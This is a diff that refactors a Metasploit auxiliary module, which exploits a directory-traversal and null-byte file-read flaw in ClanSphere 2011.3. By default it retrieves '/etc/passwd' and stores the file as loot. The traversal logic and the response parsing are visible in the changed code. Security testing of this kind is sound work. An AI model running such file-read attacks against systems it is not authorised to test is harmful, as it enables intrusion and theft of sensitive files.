@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -38,7 +35,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('TARGETURI', [true, 'The URI path to the web application', '/clansphere_2011.3/']),
         OptString.new('FILE',      [true, 'The file to obtain', '/etc/passwd']),
         OptInt.new('DEPTH',        [true, 'The max traversal depth to root directory', 10])
-      ], self.class)
+      ])
   end
 
 
@@ -47,7 +44,7 @@ class Metasploit3 < Msf::Auxiliary
 
     peer = "#{ip}:#{rport}"
 
-    print_status("#{peer} - Reading '#{datastore['FILE']}'")
+    print_status("Reading '#{datastore['FILE']}'")
 
     traverse = "../" * datastore['DEPTH']
     f = datastore['FILE']
@@ -60,14 +57,14 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if res and res.body =~ /^Fatal error\:/
-      print_error("#{peer} - Unable to read '#{datastore['FILE']}', possibily because:")
+      print_error("Unable to read '#{datastore['FILE']}', possibily because:")
       print_error("\t1. File does not exist.")
       print_error("\t2. No permission.")
       print_error("\t3. #{ip} isn't vulnerable to null byte poisoning.")
 
     elsif res and res.code == 200
       pattern_end = "     UTC +1 - Load:"
-      data = res.body.scan(/\<div id\=\"bottom\"\>\n(.+)\n\x20{5}UTC.+/m).flatten[0].lstrip
+      data = res.body.scan(/\<div id\=\"bottom\"\>\n(.+)\n\x20{5}UTC/).flatten[0].lstrip
       fname = datastore['FILE']
       p = store_loot(
         'clansphere.cms',
@@ -78,11 +75,10 @@ class Metasploit3 < Msf::Auxiliary
       )
 
       vprint_line(data)
-      print_good("#{peer} - #{fname} stored as '#{p}'")
+      print_good("#{fname} stored as '#{p}'")
 
     else
-      print_error("#{peer} - Fail to obtain file for some unknown reason")
+      print_error("Fail to obtain file for some unknown reason")
     end
   end
-
 end
